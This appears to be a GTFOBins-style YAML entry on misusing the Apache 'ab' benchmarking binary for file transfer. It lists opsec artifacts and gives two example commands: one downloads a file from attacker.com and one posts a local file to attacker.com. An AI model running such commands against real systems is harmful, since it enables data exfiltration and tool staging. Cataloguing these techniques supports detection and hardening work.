---
name: ab
capabilities:
- upload
- download
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: false
examples:
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: ab -v2 http://attacker.com/path/to/input-file
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: ab -p /path/to/input-file http://attacker.com/
references:
- https://gtfobins.github.io/gtfobins/ab/
tags: []
---
